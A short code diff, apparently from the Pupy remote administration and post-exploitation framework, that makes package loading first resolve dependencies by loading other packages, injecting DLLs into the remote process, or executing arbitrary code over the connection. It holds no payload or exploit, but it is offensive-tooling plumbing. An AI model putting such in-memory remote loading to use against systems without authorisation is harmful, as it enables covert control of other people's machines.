@@ -22,6 +22,7 @@ import cPickle
 from .PupyErrors import PupyModuleError
 import traceback
 import textwrap
+from .PupyPackagesDependencies import packages_dependencies, LOAD_PACKAGE, LOAD_DLL, EXEC
 
 class PupyClient(object):
 	def __init__(self, desc, pupsrv):
@@ -117,8 +118,19 @@ class PupyClient(object):
 		if not self.conn.modules.pupy.load_dll(name, buf):
 			raise ImportError("load_dll: couldn't load %s"%name)
 		self.imported_dlls[name]=True
-
 	def load_package(self, module_name, force=False):
+		if module_name in packages_dependencies:
+			for t,v in packages_dependencies[module_name]:
+				if t==LOAD_PACKAGE:
+					self._load_package(v, force)
+				elif t==LOAD_DLL:
+					self.load_dll(v)
+				elif t==EXEC:
+					self.conn.execute(v)
+				else:
+					raise PupyModuleError("Unknown package loading method %s"%t)
+		self._load_package(module_name, force)
+	def _load_package(self, module_name, force=False):
 		""" 
 			load a python module into memory depending on what OS the client is.
 			This function can load all types of modules in memory for windows both x86 and amd64 including .pyd C extensions
